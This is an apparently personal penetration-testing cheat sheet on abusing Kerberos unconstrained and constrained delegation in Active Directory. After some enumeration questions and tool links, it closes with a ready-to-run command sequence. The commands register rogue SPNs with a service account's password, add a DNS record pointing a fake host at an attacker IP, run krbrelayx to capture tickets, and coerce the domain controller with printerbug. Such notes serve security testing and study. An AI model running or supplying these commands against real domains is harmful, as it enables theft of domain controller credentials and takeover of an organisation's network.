# [Delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations)

## Questions to ask yourself
  *  Any user/computer objects with unreadable [delegation attributes](https://github.com/SpacemanHenry/hacknotes/blob/main/Information%20Gathering/Service%20Enumeration/LDAP.md#delegation-permissions)?
  *  Any unconstrained objects [kerberoastable](https://github.com/SpacemanHenry/hacknotes/blob/main/Exploitation/Authentication/Kerberos/Kerberoast.md)?
  *  What services have service principal names configured?
      *  What users have high privileges over those services?

## Things to remember
  *  Unconstrained delegation requires changes from default config for user accounts

## Useful tools
  *  [`krbrelayx`](https://github.com/dirkjanm/krbrelayx) toolkit for abusing unconstrained delegation
  *  [`impacket-getST`](https://github.com/fortra/impacket/blob/master/examples/getST.py) for impersonating users via constrained delegation

## [Unconstrained delegation](https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)
  *  KDC will provide a service with a TGT of any user that auths via SPN
      *  Any method of coerced authentication can often be used
  *  Abusing user accounts with unconstrained delegation relies on [`Write servicePrincipalName`](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-ver16)
      *  Create SPN and for service account using fake hostname
      *  Create DNS entry matching hostname pointing to attacker IP
      *  Coerce authentication to the fake hostname SPNs and capture TGT
  *  Add FQDN of domain controller to `hosts` file to avoid DNS errors

// Unconstrained delegation abuse via service (user) account 
```
git clone https://github.com/dirkjanm/krbrelayx && cd krbrelayx
python3 addspn.py -u corp.local\\sqlsvc -p 'password' -s host/FAKE.CORP.LOCAL ldap://DC.CORP.LOCAL
python3 addspn.py -u corp.local\\sqlsvc -p 'password' -s cifs/FAKE.CORP.LOCAL ldap://DC.CORP.LOCAL
python3 dnstool.py -u corp.local\\sqlsvc -p 'password' -r FAKE.CORP.LOCAL -a add -d [ATTACKER IP] DC.CORP.LOCAL
python3 krbrelayx.py --krbsalt CORP.LOCALsqlsvc --krbpass 'password'
python3 printerbug.py corp.local/sqlsvc:'password'@DC.CORP.LOCAL FAKE.CORP.LOCAL
```
